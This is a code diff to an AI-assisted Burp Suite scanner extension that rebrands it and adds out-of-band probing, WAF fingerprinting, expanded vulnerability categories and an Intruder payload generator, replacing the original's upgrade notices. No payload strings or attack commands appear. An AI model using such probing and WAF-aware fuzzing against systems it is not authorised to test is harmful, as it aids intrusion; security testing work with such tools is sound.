+        request_text = self.helpers.bytesToString(request_bytes)
+        seen_ranges = set()
+
+        params = list(request_info.getParameters() or [])
+        for param in params[:12]:
+            try:
+                start = int(param.getValueStart())
+                end = int(param.getValueEnd())
+            except Exception:
+                start = -1
+                end = -1
+
+            if start < 0 or end <= start:
+                name = str(param.getName() or "")
+                value = str(param.getValue() or "")
+                if not name:
+                    continue
+
+                if value:
+                    marker = "%s=%s" % (name, value)
+                    idx = request_text.find(marker)
+                    if idx >= 0:
+                        start = idx + len(name) + 1
+                        end = start + len(value)
+                else:
+                    marker = name + "="
+                    idx = request_text.find(marker)
+                    if idx >= 0:
+                        start = idx + len(marker)
+                        end = start
+
+            if start >= 0 and end >= start:
+                key = (start, end)
+                if key in seen_ranges:
+                    continue
+                seen_ranges.add(key)
+                positions.add(jarray_array([int(start), int(end)], "i"))
+
+        return positions
+
+    def run_oob_probe_context(self, messages):
+        if not self.ENABLE_OOB_TESTING:
+            self.stdout.println("[OOB] OOB testing is disabled in Settings")
+            return
+
+        t = threading.Thread(target=self._run_oob_probe_context_thread, args=(messages,))
+        t.setDaemon(True)
+        t.start()
+
+    def _run_oob_probe_context_thread(self, messages):
+        triggered = 0
+        for message in list(messages)[:5]:
+            try:
+                result = self._run_oob_probe_for_message(
+                    message, context_label="Context Menu"
+                )
+                if result and result.get("sent"):
+                    triggered += 1
+            except Exception as e:
+                self.stderr.println("[!] OOB context probe error: %s" % str(e))
+
+        if triggered == 0:
+            self.stdout.println("[OOB] No OOB probe was sent")
+        else:
+            self.stdout.println("[OOB] OOB probe completed for %d request(s)" % triggered)
+
+    def detect_waf_from_context(self, messages):
+        if not self.ENABLE_WAF_DETECTION:
+            self.stdout.println("[WAF] WAF detection is disabled in Settings")
+            return
+
+        for message in list(messages)[:10]:
+            try:
+                req = self.helpers.analyzeRequest(message)
+                profile = self._detect_waf_profile(messageInfo=message)
+                if profile.get("detected"):
+                    self.stdout.println(
+                        "[WAF] %s -> %s (confidence=%s)"
+                        % (
+                            str(req.getUrl()),
+                            profile.get("vendor", "Unknown WAF"),
+                            str(profile.get("confidence", 0)),
+                        )
+                    )
+                else:
+                    self.stdout.println("[WAF] %s -> no WAF fingerprint found" % str(req.getUrl()))
+            except Exception as e:
+                self.stderr.println("[!] WAF detection error: %s" % str(e))
 
     def test_ai_connection(self):
         self.stdout.println(
@@ -2655,8 +4241,8 @@ class BurpExtender(
         try:
             req = urllib2.Request(base_url + "/models")
             req.add_header("Authorization", "Bearer " + api_key)
-            req.add_header("HTTP-Referer", "https://silentchain.ai")
-            req.add_header("X-Title", "SILENTCHAIN AI")
+            req.add_header("HTTP-Referer", "https://code-x.my")
+            req.add_header("X-Title", "Code-AIxBurp")
 
             response = urllib2.urlopen(req, timeout=10)
             data = json.loads(response.read())
@@ -2682,8 +4268,8 @@ class BurpExtender(
             req = urllib2.Request(base_url + "/chat/completions", data=payload)
             req.add_header("Content-Type", "application/json")
             req.add_header("Authorization", "Bearer " + api_key)
-            req.add_header("HTTP-Referer", "https://silentchain.ai")
-            req.add_header("X-Title", "SILENTCHAIN AI")
+            req.add_header("HTTP-Referer", "https://code-x.my")
+            req.add_header("X-Title", "Code-AIxBurp")
 
             response = urllib2.urlopen(req, timeout=15)
             data = json.loads(response.read())
@@ -2700,18 +4286,16 @@ class BurpExtender(
         self.stdout.println("")
         self.stdout.println("=" * 65)
         self.stdout.println("")
-        self.stdout.println("     SILENTCHAIN AI")
+        self.stdout.println("     Code-AIxBurp")
         self.stdout.println("     ---------------")
         self.stdout.println(
             "     AI-Powered OWASP Top 10 Vulnerability Scanning for Burp Suite"
         )
         self.stdout.println("")
-        self.stdout.println("     COMMUNITY EDITION v%s" % self.VERSION)
-        self.stdout.println("")
         self.stdout.println("     Intelligent | Silent | Adaptive | Comprehensive")
         self.stdout.println("")
-        self.stdout.println("     Upgrade to Professional for Active Testing")
-        self.stdout.println("     https://silentchain.ai")
+        self.stdout.println("     WAF + Payload Libraries + OOB + Intruder Ready")
+        self.stdout.println("     https://code-x.my")
         self.stdout.println("")
         self.stdout.println("=" * 65)
         self.stdout.println("")
@@ -2751,7 +4335,7 @@ class BurpExtender(
         return None
 
     def doActiveScan(self, baseRequestResponse, insertionPoint):
-        # Community Edition: No active scanning
+        # Passive-only active scan hook
         return []
 
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
@@ -2970,6 +4554,13 @@ class BurpExtender(
                 res_body = "[Binary/non-UTF8 content]"
 
             res_headers = [str(h) for h in res.getHeaders()[:10]]
+            waf_profile = {"detected": False}
+            if self.ENABLE_WAF_DETECTION:
+                waf_profile = self._detect_waf_profile(
+                    messageInfo=messageInfo,
+                    response_text=res_body,
+                    response_headers=res_headers,
+                )
 
             params_sample = [
                 {
@@ -2991,6 +4582,7 @@ class BurpExtender(
                 "request_body": req_body,
                 "response_headers": res_headers,
                 "response_body": res_body,
+                "waf_profile": waf_profile,
             }
 
             if self.VERBOSE:
@@ -3238,15 +4830,20 @@ class BurpExtender(
                         "<br><b>Remediation:</b><br>%s<br>" % item.get("remediation")
                     )
 
-                detail_parts.append("<br><br><b>Community Edition Note:</b><br>")
+                if waf_profile.get("detected"):
+                    detail_parts.append(
+                        "<br><b>WAF Fingerprint:</b> %s (confidence %s%%)<br>"
+                        % (
+                            waf_profile.get("vendor", "Generic WAF"),
+                            str(waf_profile.get("confidence", 0)),
+                        )
+                    )
+
+                detail_parts.append("<br><br><b>Enhanced Verification:</b><br>")
                 detail_parts.append(
-                    "<i>This finding was detected through passive AI analysis. "
+                    "<i>Use Verify Selected for WAF-aware payload retries, OOB checks, "
+                    "and Intruder-ready fuzzing payloads.</i><br>"
                 )
-                detail_parts.append("For active verification with exploit payloads, ")
-                detail_parts.append(
-                    "upgrade to SILENTCHAIN Professional Edition.</i><br>"
-                )
-                detail_parts.append("<a href='https://silentchain.ai'>Learn More</a>")
 
                 full_detail = "".join(detail_parts)
 
@@ -3269,6 +4866,7 @@ class BurpExtender(
                     "detail": detail,
                     "param_name": param_name,
                     "owasp": item.get("owasp", ""),
+                    "waf_profile": waf_profile,
                 }
                 self.add_finding(url, title, severity, burp_conf, messageInfo, vuln_details)
 
@@ -3286,7 +4884,7 @@ class BurpExtender(
         return (
             "Security expert. Output ONLY JSON array. NO markdown.\n"
             "Analyze for OWASP Top 10, CWE.\n"
-            "Categories: Injection, XSS, Auth, Access Control, Misconfiguration.\n"
+            "Categories: Injection, XSS, Auth, Access Control, Misconfiguration, SSRF, Path Traversal, SSTI.\n"
             'Format: {"title":"name","severity":"High|Medium|Low|Information",'
             '"confidence":50-100,"detail":"desc","cwe":"CWE-X",'
             '"owasp":"A0X:2021","remediation":"fix"}\n'
@@ -3475,8 +5073,8 @@ class BurpExtender(
         req = urllib2.Request(base_url + "/chat/completions", data=payload)
         req.add_header("Content-Type", "application/json")
         req.add_header("Authorization", "Bearer " + api_key)
-        req.add_header("HTTP-Referer", "https://silentchain.ai")
-        req.add_header("X-Title", "SILENTCHAIN AI")
+        req.add_header("HTTP-Referer", "https://code-x.my")
+        req.add_header("X-Title", "Code-AIxBurp")
 
         resp = urllib2.urlopen(req, timeout=self.AI_REQUEST_TIMEOUT)
         data = json.loads(resp.read())
@@ -3629,6 +5227,27 @@ class VerifiedCellRenderer(DefaultTableCellRenderer):
                 c.setBackground(table.getSelectionBackground())
 
         return c
+
+
+class CodeAIxBurpIntruderPayloadGenerator(IIntruderPayloadGenerator):
+    def __init__(self, extender):
+        self.extender = extender
+        self.payloads = extender.get_intruder_payloads()
+        self.index = 0
+
+    def hasMorePayloads(self):
+        return self.index < len(self.payloads)
+
+    def getNextPayload(self, baseValue):
+        if self.index >= len(self.payloads):
+            return self.extender.helpers.stringToBytes("")
+        payload = self.payloads[self.index]
+        self.index += 1
+        return self.extender.helpers.stringToBytes(str(payload))
+
+    def reset(self):
+        self.payloads = self.extender.get_intruder_payloads()
+        self.index = 0
 
 
 class CustomScanIssue(IScanIssue):
